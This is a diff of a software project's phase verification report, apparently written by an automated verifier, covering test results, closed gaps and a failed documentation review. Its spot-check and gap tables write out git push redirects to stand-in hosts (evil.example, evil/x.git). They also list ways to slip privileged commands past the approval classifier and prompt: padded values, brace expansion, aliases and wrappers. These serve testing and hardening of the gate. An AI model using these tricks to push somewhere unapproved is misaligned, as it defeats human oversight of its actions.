@@ -1,8 +1,8 @@
 ---
 phase: 04-profiles-retrieval-budgets-restricted-mode-and-the-portabili
-verified: 2026-11-23T12:00:00Z
-status: human_needed
-score: 6/6 must-haves verified
+verified: 2026-11-25T12:00:00Z
+status: gaps_found
+score: 5/6 must-haves verified
 covered_files:
   - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-01-PLAN.md
   - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-01-SUMMARY.md
@@ -114,71 +114,97 @@ covered_files:
   - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-54-SUMMARY.md
   - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-55-PLAN.md
   - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-55-SUMMARY.md
-  - docs/decisions/ADR-016-ac8-token-bound.md
-  - docs/requirements.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-56-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-56-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-57-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-57-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-58-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-58-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-59-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-59-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-60-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-60-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-61-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-61-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-62-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-62-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-63-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-63-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-64-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-64-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-65-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-65-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-66-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-66-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-67-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-67-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-68-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-68-SUMMARY.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-69-PLAN.md
+  - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-69-SUMMARY.md
+  - docs/decisions/ADR-017-ac8-brief-coverage.md
+  - docs/system/containment.md
   - docs/system/coverage.md
+  - docs/system/indexes-and-context.md
+  - docs/system/policy-and-approvals.md
   - scripts/eval-retrieval.ts
-  - src/app/retrieval-guard.ts
+  - src/adapters/fs/profile-bindings.ts
+  - src/adapters/fs/profile-registry.ts
+  - src/adapters/git/run-workspace.ts
+  - src/app/authorize.ts
+  - src/app/context.ts
+  - src/app/run-stages/restricted.ts
   - src/domain/approval.ts
+  - src/domain/cache-scope.ts
   - src/domain/enforcement-map.ts
   - src/domain/hook-decision.ts
   - src/domain/privileged-commands.ts
   - src/hook/pre-tool-use.ts
-  - test/benchmark/phase4/eval-verdict-adr016.json
-covered_digest: "v3:sha256:6a685d6c35bce5a01616394c3ee0f147947acb8588b87f5f20c9657f7a7563a9"
+  - src/ports/run-workspace.ts
+  - test/benchmark/phase4/eval-coverage.json
+  - test/benchmark/phase4/eval-success-amendment.json
+  - test/benchmark/phase4/eval-verdict-adr017.json
+covered_digest: "v3:sha256:5481e6e75624f55231e39faa0f51c8efb3d381d97cb3b04f69be22c859fea8bc"
 behavior_unverified: 0
 overrides_applied: 0
 re_verification:
-  previous_status: gaps_found
-  previous_score: 4/6
+  previous_status: human_needed
+  previous_score: 6/6
   gaps_closed:
-    - "SC2: AC-8 token bound (closed by owner decision (a), ADR-016: bound 95% inclusive; recorded runs re-judge as PASS via arm B at 94.4%)"
-    - "SC3: attended approval gate fail-open defects CR-01 (65,536-character limit), CR-02 (quote and nesting), CR-03 (git global options and env not bound), CR-04 (one approval for a compound line), and CR-05 (heading-parser ReDoS)"
-    - "SC6 override (group C documents unreviewed): superseded, all groups passed a fresh review in 04-54 rounds 1 to 5 and coverage.md marks every changed document reviewed"
-  gaps_remaining: []
+    - "G-04-1 approval prompt hides part of long bound values (GCR-01)"
+    - "G-04-2 review-gap findings GWR-01 to GWR-07 and GIN-01 to GIN-05"
+    - "G-04-3 AC-8 success ignored the brief (restated under ADR-017)"
+    - "G-04-4 test suite on Node 22.22.3"
+  gaps_remaining:
+    - "SC6 every new or changed docs/system document had a fresh-eyes review"
   regressions: []
-deferred: []
-advisory:
-  - finding: "GWR-01 to GWR-03: classification evasions not seen by the attended classifier (`gh pr -R x/y create`, brace expansion `git pus{h,}`, same-line alias `git -c alias.p=push p`)"
-    category: security
-    reason: "Reproduced by the verifier (classifyLine returns none for all three). Same class as the fixed WR-01/WR-03; untriaged in 04-REVIEW-GAPS.md; the attended hook is an owner-accepted partial control (AR-04-02)"
-    evidence_status: "reproduced by classifyLine probe; no failing named test exists"
-  - finding: "GWR-04 to GWR-07 and GIN-01 to GIN-05 of 04-REVIEW-GAPS.md (restricted patch dropped for a file name with a space, stale bindings lock after PID reuse, corrupt profile config not denied in knownProfileRoots, bindings race test does not prove overlap, and info items)"
-    category: other
-    reason: "Not reproduced by the verifier; untriaged; none changes a roadmap success criterion"
-    evidence_status: "reviewer-reported, not run"
-  - finding: "9 deferred review warnings (WR-14, WR-23, WR-26, WR-28, WR-29, WR-32, WR-36, WR-37, WR-38) and 1 skipped (WR-34) in 04-REVIEW-DISPOSITION.md"
-    category: other
-    reason: "Each has a recorded target (Phase 5, Phase 7, or before any further AC-8 run) in deferred-items.md; none touches a roadmap success criterion"
-    evidence_status: "recorded dispositions"
-  - finding: "limits.maxConcurrentChecks test failed once in the full suite (test/integration/resource-degradation.test.ts)"
-    category: other
-    reason: "Load-sensitive timing test (30.9 s in a loaded run); the verifier re-ran the whole file alone: 30 of 30 pass"
-    evidence_status: "passes alone"
-human_verification:
-  - test: "GCR-01 (04-REVIEW-GAPS.md, critical, untriaged): decide whether the approval prompt must show every bound value. `paramsSummary` cuts each value to 80 characters, so `git -c core.x=<80 characters> -c url.https://evil.example/.insteadOf=git@github.com: push origin main` shows `gitOptions=-c core.x=aaaa...` and hides the redirect"
-    expected: "A recorded owner decision: either fix (refuse to bind what the prompt cannot show, or show the full values in `avarice approve`) or accept the residual on the stated basis that the owner reads the full command in their session (04-51 flagged assumption) and the digest binds the full text"
-    why_human: "The digest binds the full values and the roadmap and requirement wording are met, so no must-have is falsified; whether an owner who runs `avarice approve` in another terminal can rely on that prompt is a security judgment the plan decided one way and the review rejects"
-  - test: "Triage 04-REVIEW-GAPS.md: 1 critical (GCR-01), 7 warnings (GWR-01 to GWR-07), 5 info (GIN-01 to GIN-05), each to fixed, deferred or accepted in 04-REVIEW-DISPOSITION.md"
-    expected: "Every CR and WR row has a disposition before the phase PR, as the earlier review does"
-    why_human: "The orchestrator's review gate needs a disposition for each finding; GWR-01 to GWR-03 were reproduced here"
-  - test: "AC-8 spot-check of three successful runs: T01-B (run_01M7VE1FD4W0XB8JVCV66Z00GK), T04-C (run_01M7VR7YZ4QR908ENT6WPN0JG8), T05-A (run_01M7VS76KK7S2AGASBZ4W1JX5M)"
-    expected: "Each run's change is a real fix of the task and not a harness artifact (ADR-015: pending; the verdict does not depend on it under D-07)"
-    why_human: "Judging whether a diff solves the task needs a person"
-  - test: "Run the Node 22.22.3 test leg (AVARICE_NODE22=... bash scripts/test-matrix.sh)"
-    expected: "npm test green on the minimum supported Node; 04-34 recorded only the dev Node v26.9.0 leg and the machine has no Node 22"
-    why_human: "No Node 22 is installed here"
-  - test: "Confirm the committed 04-36-evidence/ (278 files, about 45 MB, private portfolio source in transcripts) before any push; origin is PUBLIC"
-    expected: "Owner keeps it (04-SECURITY.md flag 1 asks for a decision before the phase PR is pushed)"
-    why_human: "Disclosure of private repository content; owner decision"
+gaps:
+  - truth: "SC6: `docs/system/` describes what this phase built and each new or changed document had a fresh-eyes review"
+    status: failed
+    reason: "Plans 04-56 to 04-68 changed ten docs/system documents after their 04-54 review. The 04-69 review ran three rounds per group, both groups ended FAIL, and four WARNINGs (A-W1, A-W2, B-W1, B-W2) are open and unfixed. coverage.md marks all ten `changed after review`, not `reviewed`. Three of the four WARNINGs were re-checked against the code and are real inaccuracies in the documents."
+    artifacts:
+      - path: "docs/system/policy-and-approvals.md"
+        issue: "line 86: the gate's step list jumps from the approval-source steps to 'With no source ... approval-required:' and omits the `privileged:unapprovable` denial that src/app/authorize.ts:159-162 returns before the pending-request lookup (A-W1); lines 122-123 state the attended-only reason texts as if a run gave them, but a run returns the plain shell-syntax refusal (src/domain/hook-decision.ts:820-821) (A-W2)"
+      - path: "docs/system/indexes-and-context.md"
+        issue: "line 138 refers to a heading 'What the record states' that no longer exists (headings are 'Code graph record fields' line 72 and 'Knowledge record fields' line 212) (B-W1); line 285 says everything in the earlier pack that is not reused is read again, which src/app/context.ts:427-470 does not do, and says a revoked item is read again when it is dropped before any read (B-W2)"
+      - path: "docs/system/coverage.md"
+        issue: "ten documents (cli-reference, runs, containment, indexes-and-context, data-model, integrations, processes, README, profiles-and-credentials, policy-and-approvals) are `changed after review`; none is `reviewed`"
+    missing:
+      - "Fix A-W1, A-W2, B-W1, B-W2 (suggested wording is in 04-69-reviews/README.md 'Open after round 3'); the NITs are optional"
+      - "Owner authorizes a scoped round 4 per group (precedent: 04-54 round 4, scoped to the changed lines) by a fresh technical-writer:prose-reviewer; mark the ten documents `reviewed` in coverage.md only after both groups pass"
+      - "Or the owner accepts the open warnings as a recorded exception (add an `overrides:` entry); the roadmap wording 'each new or changed document had a fresh-eyes review' would then be knowingly unmet"
 ---
 
 # Phase 4: Profiles, retrieval budgets, restricted mode and the portability proof Verification Report
 
 **Phase Goal:** Separate profiles, progressive retrieval with enforced caps, explicit degradation, and proof that domain code is adapter-independent
-**Verified:** 2026-11-23
-**Status:** human_needed
-**Re-verification:** Yes, after gap closure (plans 04-40 to 04-55 and the post-merge regression fix). The earlier report was `gaps_found` (4/6).
+**Verified:** 2026-11-25
+**Status:** gaps_found
+**Re-verification:** Yes. The previous report (2026-11-23) was `human_needed` 6/6; its five human items became UAT gaps G-04-1 to G-04-4 and the review-gap findings, which plans 04-56 to 04-69 addressed. HEAD is `18fca77`. Every change since the last code commit `3a6c10c` is under `docs/system/` or `.planning/` (`git diff --stat 3a6c10c HEAD -- . ':!.planning'` lists only `docs/system/*`).
+
+## Verdict in one paragraph
+
+The code goal is achieved and every UAT gap is closed in code. The gap-closure code and tests hold at HEAD (reproduced below), and the full suite passed on Node 22.22.3 and 26.9.0 at `3a6c10c` (`04-66-node-legs.json`: 5722 tests, 0 fail, 0 cancelled, 77 skipped on both). The phase is not complete against its own roadmap, because success criterion 6 requires that each new or changed `docs/system` document had a fresh-eyes review, and ten documents changed by the gap plans have none: both review groups failed three rounds and four WARNINGs are open, three of which I confirmed against the code as real inaccuracies in the text. That is a documentation-gate gap, cheap to close (four edits and one scoped review round per group), not a defect in the built system.
 
 ## Goal Achievement
 
@@ -186,47 +212,60 @@ human_verification:
 
 | # | Success criterion | Status | Evidence |
 |---|---|---|---|
-| SC1 | Profile isolation (AC-6: 0 cross-profile reads) and redaction (AC-5: 0 secret patterns) | VERIFIED | `profile-isolation.test.ts`, `redaction-suite.test.ts`, `profile-selection.test.ts`, `profile-registry.test.ts` re-run by the verifier: green (part of 176 + 130 passing tests). 04-34 records 0 cross-profile reads. |
-| SC2 | Pack at no more than 95% of baseline tokens (AC-8, ADR-016); `status` under 300 ms p95 at 1,000 runs (AC-2) | VERIFIED | AC-8: ADR-016 (Accepted, owner Aaron Phan) sets the bound at 95% inclusive; `AC8_TOKEN_BOUND_PERCENT = 95` and an integer comparison `tokens * 100 <= a.tokens * 95` in `scripts/eval-retrieval.ts:278-292`; `eval-verdict-adr016.json` recomputes B = 18,715,894 of A = 19,833,920 tokens = 94.36%, 4 of 6 against 2 of 6 successes, pass via B; `docs/requirements.md:237` and ROADMAP SC2 carry the same bound. `eval-retrieval.test.ts` and `status-queries.test.ts` green (73 tests). AC-2: p95 206 ms recorded in 04-34. The bound was set after the result and B clears it by 0.6 points; ADR-016 records both as owner-owned negative consequences, so this is a decision, not a measurement margin. |
-| SC3 | Parameter-bound approvals, plan approval is not action approval, retrieved content grants no authority, restricted mode, offline `doctor` | VERIFIED (with one open owner decision, GCR-01) | The four reproduced fail-open defects are closed: `classifyLine` now returns `unparseable` for a 70,000-character line, classifies `echo $(echo ")"; git push)` as `git.push`, returns both `git.push` and `release.publish` for `true; git push origin main && npm publish`, and binds `gitOptions` for `git -c remote.origin.url=https://evil/x.git push origin main` (different digest from the plain push). 408 tests green across `privileged-commands`, `hook-decision`, `enforcement-map`, `hook-privileged`, `approvals`, `approval-consume`, `privileged-no-replay`. `untrusted-authority`, `restricted-onboarding`, `run-capability-gate`, `doctor` green. |
-| SC4 | Adoption never overwrites; refresh planner; AC-14 5/5, 0 containment failures | VERIFIED | `04-35-evidence-ac14.json` finish: active 5 of 5, containmentFailures 0, passed true. Refresh and adoption tests are in the full-suite pass (5469 pass). The live AC-14 and T3 records predate the gap-closure code changes (2026-11-18); the offline suite exercises the changed paths. |
-| SC5 | AC-7 portability, typed `Unsupported` naming the reduced mode, manual equivalents | VERIFIED (warning) | `test/contract/*.test.ts` and `portability-proof.test.ts` green. Warning: T-04-14 (open, below the `high` threshold): `requireCapabilities` is called by 2 of 8 step types (recorded in findings.md). |
-| SC6 | `docs/system/` current, README tables, coverage, findings, fresh review, last plan is the documentation pass | VERIFIED | 04-54 is the last plan (wave 26). `04-54-reviews/` holds rounds 1 to 5; every group ended PASS (round 4 scoped by owner decision to the changed lines, round 5 for the one changed file). `coverage.md` marks `containment.md`, `data-model.md`, `integrations.md` reviewed (the "close drafted" state is gone, line 107), so the earlier override no longer applies. No source file changed after the counting commit `96a0718` (`git diff 96a0718 HEAD -- src scripts test` is empty). |
+| SC1 | Profile isolation (AC-6: 0 cross-profile reads) and redaction (AC-5: 0 secret patterns) | VERIFIED | `profile-isolation`, `redaction-suite`, `profile-registry` and `profile-bindings-lock` suites re-run at HEAD: green. GWR-06 is closed: `knownProfileRoots` denies the whole root of a corrupt config (the 5 new corrupt-config cases pass). GWR-05 closed: `lockIsStale` over PID reuse (`test/unit/profile-bindings-lock.test.ts` passes). GWR-07 closed: `test/fault/bindings-race.test.ts` passes (overlap asserted, unlocked control). |
+| SC2 | Pack at no more than 95% of baseline tokens (AC-8, ADR-016); `status` under 300 ms p95 with 1,000 runs (AC-2) | VERIFIED (caveat) | `eval-verdict-adr017.json`: B = 18,715,894 of A = 19,833,920 tokens = 94.36%, inside the 95% bound; `eval-retrieval.test.ts` (78 tests) passes, including the test that recomputes the committed ADR-017 verdict from the committed results, coverage record and approved amendment. `status-queries.test.ts` passes. Caveat, disclosed in ADR-017 itself: under the amended success rule arm A has 0 successes, so the success clause holds trivially for B and C and the pass rests on the token bound alone (B clears it by 0.6 points, one measurement of 6 tasks). The owner accepted this on 2026-11-25. |
+| SC3 | Privileged action without a matching parameter-bound approval is denied; plan approval is not action approval; retrieved content grants no authority; restricted mode; offline `doctor` | VERIFIED (one residual warning) | Reproduced with `classifyLine` at HEAD (see spot-checks). 765 tests in 14 gap-related files pass; 96 tests in 8 SC1/SC3/SC4/SC5 files pass. Residual WR-02 below. |
+| SC4 | Adoption never overwrites; refresh planner; AC-14 5 of 5 with 0 containment failures | VERIFIED | `refresh-scoped`, `restricted-onboarding`, `doctor` suites pass at HEAD. `04-35-evidence-ac14.json` (previous report): active 5 of 5, containmentFailures 0. No source touched by the gap plans is on the adoption or refresh path except `src/app/context.ts` (pack format stamp), whose tests pass. |
+| SC5 | AC-7 portability, typed `Unsupported`, manual equivalents | VERIFIED (warning) | `portability-proof.test.ts` and `test/contract/domain-contracts.test.ts` pass at HEAD. Warning carried forward: T-04-14 (`requireCapabilities` called by 2 of 8 step types; open below the `high` threshold in `04-SECURITY.md`, recorded in findings.md). |
+| SC6 | `docs/system/` current; README tables, `coverage.md`, `findings.md` current; each new or changed document had a fresh-eyes review; the last plan is the documentation pass | FAILED | 04-69 is the last plan and wrote the documents and ledger entries (coverage.md counts re-run at `3a6c10c`, README counterparts row for ADR-017, findings lines). The review half is unmet: `04-69-reviews/README.md` records both groups FAIL after round 3 ("closed without a pass"), and coverage.md marks ten documents `changed after review`. Open WARNINGs A-W1, A-W2, B-W1, B-W2 are not fixed. I re-checked A-W1 (`policy-and-approvals.md:86` list has no unapprovable step; `authorize.ts:159-162` does), B-W1 (`grep "What the record states" docs/system` matches only `indexes-and-context.md:138`; the headings are renamed) and B-W2 (`indexes-and-context.md:285` vs `context.ts:427-470`): all three are accurate findings. See Gaps. |
 
-**Score:** 6/6 truths verified. No override is applied (the earlier SC6 override is superseded).
+**Score:** 5/6 truths verified. No override applied.
 
-### Gaps from the earlier report
+### Bearing of the failed prose review on SC6
 
-| Earlier gap | Now | Basis |
+CLAUDE.md says each new or changed `docs/system/` document is reviewed by a fresh `technical-writer:prose-reviewer` before it is marked reviewed in `coverage.md`, and ROADMAP SC6 repeats "each new or changed document had a fresh-eyes review". 04-69 handled this honestly: it did not mark any document `reviewed`, it left the unreviewed edits unmade after round 3, and coverage.md says "changed after review". That honesty keeps the ledger trustworthy, but it does not satisfy the criterion. A criterion that asks for a passed review is not met by a recorded failed review. The failing findings are not stylistic: A-W1, A-W2 and B-W2 each state something the code contradicts. So the phase's documentation is not yet "current" in the sense SC6 requires either. The fix is small and the process exists (04-54 round 4 was scoped by the owner to the changed lines).
+
+### UAT gaps: closure state at HEAD
+
+| UAT gap | Closed? | Evidence I produced (not taken from SUMMARY.md) |
 |---|---|---|
-| SC2 AC-8 fails the 50% bound | Closed by owner decision (a), ADR-016 | ADR-016 Accepted; harness constant and verdict file recomputed above; 04-50 summary quotes the owner's answer |
-| SC3 CR-01, CR-02 (fail open past limits, quoted parenthesis) | Closed | Reproduced as `unparseable` and as `git.push`; shell-oracle corpus in `privileged-commands.test.ts` passes |
-| SC3 CR-04 (first action only) | Closed | Two commands returned for the compound line; `consumeLine` takes one approval per command |
-| SC3 CR-03 (options bound by name, not value) | Closed in the digest; display gap remains as GCR-01 | `gitOptions`, `env` and `line` in the params; the owner-visible text still cuts each value at 80 characters (below) |
-| CR-05 heading ReDoS; 42 open warnings | Closed | `gsd-planning-headings.test.ts` and `context-adapters.test.ts` pass; `04-REVIEW-DISPOSITION.md`: 5 critical fixed, 32 warnings fixed, 9 deferred with targets, 1 skipped, 0 open |
+| G-04-1 approval prompt hides long bound values (GCR-01) | Closed for the reported defect; narrow residual WR-02 | `unshowableReason({line, gitOptions: '-c core.x=' + 'a'*100})` returns "a bound value cannot be shown whole (gitOptions is 110 characters; at most 80 are shown); the owner can run the command at their own terminal". `authorize.ts:159-162` and `pre-tool-use.ts:458,726` call it before any request is written. `approval.test.ts`, `hook-privileged.test.ts` and `approvals.test.ts` pass. Residual: `unshowableReason` refuses control characters but not the invisible formatting characters that `approve`'s display strips (`stripControl`). Probe: `{remote: 'https://github.com/ab/c', gitOptions: '-c x=y'}` returns `unshowableReason` undefined, and `paramsSummary` holds the characters while the `approve` display removes them. The digest still binds the exact text, so this is a look-alike risk, not the padded hidden option of the gap (review WR-02, open, one-line fix in the review). |
+| G-04-2 GWR-01 (`gh` persistent flags) | Closed | `classifyLine('gh pr -R x/y create')` returns `scm.pr.create` with repo `x/y`; `gh pr --repo=x/y merge 1` returns `scm.pr.merge`; `gh release -R x create v1` returns `release.publish`. |
+| GWR-02 (brace expansion) | Closed | `git pus{h,}`, `{git,push}`, `g{i,}t push` each return `unparseable` ("a brace expansion or a glob decides which command runs"). |
+| GWR-03 (same-line git alias) | Closed | `git -c alias.p=push p`, `git --config-env=alias.p=X p`, `GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p` each return `unparseable`. Review IN-02 (an alias created earlier on the line by `git config alias.p push && git p`) is a recorded info-level residual. |
+| GWR-04 (restricted patch drops in-scope edits for an odd out-of-scope file name) | Closed | `excludePaths` with `:(exclude,literal)` in `run-workspace.ts` and `restricted.ts`; `restricted-mode.test.ts` and `run-workspace.test.ts` pass at HEAD. Review IN-03 (very many out-of-scope files) is a recorded info-level residual. |
+| GWR-05 (PID-reuse lock) | Closed | `lockIsStale` pure rule and `profile-bindings-lock.test.ts` pass. |
+| GWR-06 (corrupt config) | Closed | `profile-registry.test.ts` "a corrupt profile config is denied whole (GWR-06)" passes (5 cases). |
+| GWR-07 (race test overlap) | Closed | `bindings-race.test.ts` passes. |
+| GIN-01 (here-doc double scan) | Closed | `cat <<EOF\n$(git push)\nEOF` returns exactly one `git.push`. |
+| GIN-02 (wrappers) | Closed | `doas`, `su -c`, `find -exec`, `parallel`, `watch`, `taskset`, `arch`, `caffeinate`, `unbuffer`, `chronic`, `coproc`, `trap "git push"` and `bash <<< "git push"` each classify as `git.push`. Review IN-01 (`coproc NAME { }`, `sudo -s/-i`) is a recorded info-level residual. |
+| GIN-03 (brace-glob refusal text) | Closed | `hook-decision.test.ts` and `hook-retrieval.test.ts` pass. |
+| GIN-04 (`stepSpendUsd`) | Closed | `eval-retrieval.test.ts` passes. |
+| GIN-05 (stale pack-item format) | Closed | `PACK_ITEM_FORMAT` in `cache-scope.ts`; `cache-scope.test.ts` passes. |
+| G-04-3 AC-8 success ignores the brief | Closed | Owner decision implemented as ADR-017 (Accepted), pinned `eval-coverage.json` (18 runs) and owner-approved `eval-success-amendment.json`; `eval-verdict-adr017.json` equals the harness output (unit test passes); `briefFor` no longer forbids the e2e work. Restated figures: A 0, B 2, C 3 successes. The `docs/operations-and-testing.md` score sentence is updated. Residual noted by ADR-017: the verdict now rests on the token bound. |
+| G-04-4 Node 22.22.3 | Closed | `test/helpers/run-fixtures.ts:30` now uses the glob `node --test \"test/**/*.test.ts\"`; `fake-run-host.ts:568` likewise; no `node --test test/` directory form remains in `test/` or `scripts/`. I re-ran `run-status.test.ts` and `run-independent-work.test.ts` on Node v22.22.3 (the failing file of the UAT): 40 of 40 pass (it was 15 of 27 failing). Full-suite legs recorded at `3a6c10c`: both exit 0, 0 fail. |
+| UAT test 5 (public push of `04-36-evidence/`) | Already passed | Owner decision recorded. |
 
-### GCR-01 weighed against the must-haves
+### Anti-pattern and gate checks
 
-Reproduced: `paramsSummary` on `git -c core.x=<80 a> -c url.https://evil.example/.insteadOf=git@github.com: push origin main` prints `gitOptions=-c core.x=aaaa...… line=sha256:79383a63... refspec=main remote=origin`; the string `evil.example` is absent. `avarice approve` prints only that summary, then says "grants: one use ... with exactly these parameters". The digest covers the full text, so the approval cannot be spent on a different command, and an approval for this line is still denied for any other line.
+| Check | Result |
+|---|---|
+| Debt markers (`TBD`, `FIXME`, `XXX`) in `src`, `scripts`, `bin`, `docs/system` | none |
+| `tsc -p .` | exit 0 |
+| `node scripts/check-boundaries.ts` | ok (132 files) |
+| Code changed since the last full-suite run | none: only `docs/system` and `.planning` after `3a6c10c` |
+| I did not rerun the full suite (about 23 minutes per Node leg); I ran 22 targeted files (861 tests, 0 fail) plus the two Node 22 files | |
 
-What it does not defeat: ROADMAP SC3 ("a privileged action without a matching parameter-bound approval is denied") and FR-12's wording ("an approval bound to run, action and parameters") are met, and plan 04-51's truth ("a value cut for display ends with '…'") is met by design; the plan's flagged assumption states that the owner sees the full command in their session. What it weakens: the intent that the owner approves what they saw. A model that wants to redirect a push can arrange for the redirecting option to sit past character 80, and an owner who relies on the `approve` output alone cannot read it. I rate it WARNING with a human decision (the review rates it critical). It is the only item that could reasonably turn the verdict into `gaps_found`; if the owner decides the prompt must show what it binds, the fix is small (refuse to bind a value longer than the display cap, or print the full values).
-
-### Behavioral spot-checks (verifier-run)
+### Behavioral spot-checks (verifier-run, read-only)
 
 | Behavior | Command | Result | Status |
 |---|---|---|---|
-| Types and import boundaries | `npm run typecheck`; `npm run check:boundaries` | clean; ok (132 files) | PASS |
-| 70,000-character `git push` line | `classifyLine` | `unparseable` ("longer than 65,536 characters") | PASS |
-| Quoted parenthesis in `$(...)` | `classifyLine('echo $(echo ")"; git push)')` | `git.push` | PASS |
-| Compound line | `true; git push origin main && npm publish` | `git.push` and `release.publish` | PASS |
-| Git global option bound | `git -c remote.origin.url=https://evil/x.git push origin main` | `gitOptions` in params, digest differs from the plain push | PASS |
-| Brace expansion, `gh pr -R x/y create`, `git -c alias.p=push p` | `classifyLine` | `none` for all three (GWR-01 to GWR-03) | FAIL (warning, untriaged) |
-| Approval prompt shows redirecting option | `paramsSummary` on a padded `gitOptions` | option hidden after 80 characters (GCR-01) | FAIL (human decision) |
-| SC3 and SC1 suites | `node --test` on 7 files (408 tests) and 12 files (176 tests) and 5 files (130 tests) | all pass | PASS |
-| AC-8 and AC-2 | `node --test test/unit/eval-retrieval.test.ts test/integration/status-queries.test.ts` | 73 pass | PASS |
-| `limits.maxConcurrentChecks` flake | `node --test test/integration/resource-degradation.test.ts` | 30 of 30 pass alone | PASS |
-
-The full suite was not repeated (about 30 minutes). Its recorded result after the regression fix: 5547 tests, 5469 pass, 77 skipped, 1 fail (`limits.maxConcurrentChecks`, a 30.9 s timing case under load, passing alone). I treat that as a load flake, not a gap.
+| Classifier probes for GWR-01/02/03, GIN-01/02 | `node probe.ts` calling `classifyLine` on 24 lines | all as in the table above | PASS |
+| Over-long bound value refused | `unshowableReason` | refused with named key and length | PASS |
+| Invisible formatting character refused | `unshowableReason({remote:'......'})` | `undefined` (not refused) | FAIL (warning, WR-02) |
+| Gap-related files (14) | `node --test` | 765 pass, 0 fail | PASS |
+| SC1/SC3/SC4/SC5 files (8) | `node --test` | 96 pass, 0 fail | PASS |
+| Node 22.22.3 leg on the UAT's failing file | `node22 --test run-status + run-independent-work` | 40 pass, 0 fail | PASS |
 
 ### Probe execution
 
@@ -234,34 +273,24 @@ Step 7c: no `scripts/*/tests/probe-*.sh` exists and no plan declares a probe. Sk
 
 ### Requirements coverage
 
-All 28 IDs (ONB-6, ONB-11, ONB-15, FR-3, FR-8, FR-12..FR-19, FR-22, SEC-1..SEC-4, SEC-6, SEC-7, CON-4, CON-10..CON-12, OPS-1, OPS-5, OPS-6, NFR-4) appear in the ROADMAP list, in the `requirements` field of at least 3 of the 55 PLAN files, and in `requirements-completed` of at least 3 SUMMARY files (checked by script). None is orphaned and no Phase 4 row in REQUIREMENTS.md lies outside the list. All 28 are satisfied by the evidence above.
+All 28 IDs (ONB-6, ONB-11, ONB-15, FR-3, FR-8, FR-12 to FR-19, FR-22, SEC-1 to SEC-4, SEC-6, SEC-7, CON-4, CON-10 to CON-12, OPS-1, OPS-5, OPS-6, NFR-4) appear in the ROADMAP list, in `requirements:` of at least 3 PLAN files and in `requirements-completed:` of at least 3 SUMMARY files (script check). None is orphaned. All 28 are SATISFIED by the code evidence above (FR-12 and SEC-6 now also without the display gap), except that the documentation obligation of the phase (SC6) is unmet.
 
-Bookkeeping warning: in `.planning/REQUIREMENTS.md` 11 of the 28 (ONB-15, FR-8, FR-16, FR-17, FR-18, FR-19, SEC-4, SEC-7, CON-12, OPS-6, NFR-4) still read `[ ]` and `Gaps Found` in the traceability table from the earlier verdict; the other 17 read `Complete`. The orchestrator marks these on the phase's completion. FR-12 stays satisfied subject to the GCR-01 decision.
+Bookkeeping warning, for the orchestrator at completion: `.planning/REQUIREMENTS.md` traceability still reads `Gaps Found` for FR-8, FR-16, FR-17, FR-18, FR-19, ONB-15, SEC-4, SEC-7 and NFR-4, a stale state from the first verification. The 04-VERIFICATION of 2026-11-23 already found them satisfied.
 
-### Anti-patterns found
+### Code review, security, validation (observed, not re-run)
 
-No `TBD`, `FIXME` or `XXX` in `src`, `scripts`, `test` or `docs/system` (the debt-marker gate is clear). `TODO` appears only in a TAP-directive regex (`src/domain/reproducer.ts`). No stub or hollow data flow found in the files the gap plans changed.
+- `04-REVIEW-GAPS2.md`: 0 critical, 2 warnings (WR-01 the benchmark README still says the ADR-017 verdict is "not yet present" and quotes a 50% bound where the code and ADRs say 95%; WR-02 above), 4 info; all open in `04-REVIEW-GAPS2-DISPOSITION.md`. WR-01 is a documentation inaccuracy in `test/benchmark/phase4/README.md`; it is a second place where the phase's written record contradicts the code. I did not confirm it separately.
